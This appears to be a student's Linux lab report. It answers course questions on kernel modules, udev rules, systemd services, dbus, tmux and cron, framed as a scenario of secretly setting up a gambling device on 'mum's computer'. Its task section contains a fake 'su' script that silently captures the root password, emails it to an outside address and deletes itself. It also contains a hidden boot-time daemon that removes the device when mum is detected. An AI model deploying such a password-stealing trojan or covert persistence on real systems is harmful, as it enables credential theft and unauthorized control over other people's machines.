# l10

## ECE4820 Tasks

### 2 A clean setup

#### Where to copy the dice module for it to be officially known to the kernel?

```sh
/lib/modules/$(uname -r)/kernel/drivers/dice
```

#### What command to run in order to generate the `modules.dep` and `map` files?

```sh
sudo depmod -a
```

The generated `modules.dep` and `modules.dep.map` files will be located in `/lib/modules/$(uname -r)/`.

#### How to ensure the dice module is loaded at boot time, and how to pass it options?

```sh
sudo sh -c 'echo dice > /etc/modules-load.d/dice.conf'

# Create /etc/modprobe.d/dice.conf
options dice param1=value1 param2=value2
```

#### How to create a new `friends` group and add grandpa and his friends to it?

```sh
# Create friends group:
sudo groupadd friends

# Add usres to the group
sudo usermod -aG friends grandpa
sudo usermod -aG friends friend1
...
```

#### What is `udev` and how to define rules such that the group and permissions are automatically setup at device creation?

`udev` is a device manager for the Linux kernel, responsible for managing device nodes in the `/dev` directory. It dynamically creates or removes device files when hardware is added or removed, allowing you to define rules to automate tasks, such as setting permissions, group ownership, or creating symlinks for devices.

```sh
# Create a custon rule file:
sudo nano /etc/udev/rules.d/99-custom.rules

# Define the rule:
ACTION=="add", KERNEL=="device_name", GROUP="group_name", MODE="permissions"

# Reload and apply rules:
sudo udevadm control --reload-rules
sudo udevadm trigger
```

---

### 3 A discreet gambling setup
### 3.1 *Hacking mum's computer*

#### How adjust the `PATH`, ensure its new version is loaded but then forgotten?

```sh
# Modify PATH temporarily:
export PATH=$PATH:/new/directory/path

# Forget the modified PATH
# - Close the terminal, OR
exec $SHELL
# OR
export PATH=<original_path>
```

#### What is the exact behaviour of `su` when wrong password is input?

1. Password prompt appears.

2. Wrong password: shows `su: Authentication failure` message.

3. Number of Attempts: Three attempts are allowed

4. Exit on Failure: Returns you to the original prompt with a non-zero exit status.

#### When using the `read` command how to hide the user input?

1. Use `read -s` to hide user input.

2. Use `-p` to display a prompt message.

3. Add `echo` to add a newline after user input.

- Example:

    ```sh
    read -s -p "Enter your password: " password
    echo
    ```


#### How to send an email from the command line?

1. **Using `mail`**:

   ```bash
   echo "This is the email body" | mail -s "Subject" recipient@example.com
   ```

2. **Using `sendmail`**:

   - Create `email.txt` with email details.
   - Send using:

     ```bash
     sendmail recipient@example.com < email.txt
     ```

3. **Using `mutt`** (for attachments):

   ```bash
   echo "Email body" | mutt -s "Subject" -a /path/to/attachment recipient@example.com
   ```

4. **Using `ssmtp`** (after configuration):

   ```bash
   echo "This is the email body" | ssmtp recipient@example.com
   ```

---

## ECE4821 Tasks

### 3.2 *Automatic setup*

#### What is `systemd`, where are service files stored, and how to write one?

`systemd` is an init system and service manager used in most Linux distributions to bootstrap user space and manage processes. It controls system startup, manages services, monitors daemons, and supports on-demand starting of services, parallelized startup, and dependency management between services.

##### Service File Stored:
- `/lib/systemd/system/`: Default service files.
- `/etc/systemd/system/`: Custom service files.
- `~/.config/systemd/user/`: User-specific services.

##### Write a Service File:
- Create a new file in `/etc/systemd/system/`.
- Define sections: `[Unit]`, `[Service]`, `[Install]`.

#### How to get a `systemd` service to autostart?

1. Create Service File: Write and save it in `/etc/systemd/system/`.

2. Reload `systemd`: Run `sudo systemctl daemon-reload`.

3. Enable Autostart: Run `sudo systemctl enable myservice.service`.

4. Start the Service (Optional): Run `sudo systemctl start myservice.service`.

5. Verify Status: Check using `sudo systemctl status myservice.service`.


#### What is the difference between running `tmux` from the `systemd` service or from the `gp-2.10` daemon?

- Running `tmux` from `systemd`:

    - Managed system-wide.
    - Offers automatic restarts, centralized control, and logging.
    - Suitable for boot-time, independent service management.

- Running `tmux` from `gp-2.10` Daemon:

    - Managed in the context of a user session.
    - Better integration with user-specific processes.
    - Less robust for system-level process management, as it depends on user activity.

#### What is `dbus` and how to listen to all the system events from the command line?

- What is dbus: An inter-process communication system for Linux that facilitates communication between system services and applications.

- Listen to System Bus Events:

    - Run `dbus-monitor --system` to listen to system-wide events.

- Listen to Session Bus Events:

    - Run `dbus-monitor --session` to listen to user-specific events.

- Filter Events:

    - Example filter: `dbus-monitor "interface='org.freedesktop.NetworkManager'"`.

#### What is `tmux`, when is it especially useful, and how to run a detached session?

- What is `tmux`: A terminal multiplexer that allows you to manage multiple terminal sessions from a single screen.

- When is it Useful:

    - Remote work, long-running processes, workspace organization, and enhanced productivity.

- Run a Detached Session:

    - Start detached session: `tmux new-session -d -s mysession`.
    - List sessions: `tmux list-sessions`.
    - Attach to a session: `tmux attach-session -t mysession`.
    - Detach from session: Press `Ctrl + b, d`.

#### What is `tripwire`, what are some alternatives, and why should the configuration files also be encrypted and their corresponding plaintext deleted?

- What is `Tripwire`: A host-based intrusion detection system used for monitoring file integrity to detect unauthorized changes.

- Alternatives:
    
    - AIDE, OSSEC, Samhain, Snoopy Logger, and Chkrootkit.

- Why Encrypt Configuration Files:

    - Prevent tampering by attackers.
    - Protect sensitive information in the configuration.
    - Preserve system integrity and ensure monitoring functions correctly.

Encrypting configuration files and removing the plaintext versions enhances the security of the monitoring tool, making it harder for attackers to disable or bypass intrusion detection

#### What is `cron` and how to use it in order to run tasks at a specific time?

- What is `cron`: A scheduler used for running commands or scripts at specified times or intervals.

- Editing Crontab:

    - Run `crontab -e` to edit or create scheduled jobs.

- Define a Cron Job:

    - Use the format: `minute hour day-of-month month day-of-week command`.
    - Example: `30 3 * * * /path/to/script.sh` runs the script at 3:30 AM every day.

- Verify Cron Jobs: Use `crontab -l` to list existing jobs.

## Tasks

### Write a `dicedevice.rules` that configures the permission of dice device.

```sh
sudo nano /etc/udev/rules.d/99-dicedevice.rules
```

```ini
ACTION=="add", KERNEL=="dice*", GROUP="friends", MODE="0660"
```
### Write a script `su` that tricks mum.

```sh
#!/bin/bash

# Fake su
read -s -p "Password: " password
echo

# Send the password via email (using sendmail)
echo "Root password: $password" | sendmail jinlock99@sjtu.edu.cn

# Delete script and restore original PATH
rm -- "$0"
export PATH="${ORIGINAL_PATH}"
```

### Write a script in `usr/bin/gp-2.10` that uses `dbus-monitor` to check whether mum or grandpa is online, remove the dice device when mum is online and add the dice device if grandpa is online.

```sh
#!/bin/bash

dbus-monitor --system | while read -r line; do
    if echo "$line" | grep -q "mum"; then
        rm -f /dev/dice*
    elif echo "$line" | grep -q "grandpa"; then
        mknod /dev/dice0 c 100 0
    fi
done
```

### Write a service file `gp.service` in `/etc/systemd/system` that starts the process at boot time. The process should use tmux to open a new window that runs gp-2.10 in the background.

```ini
[Unit]
Description=GP Daemon Service
After=network.target

[Service]
Type=forking
ExecStart=/usr/bin/tmux new-session -d -s gp-daemon /usr/bin/gp-2.10
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

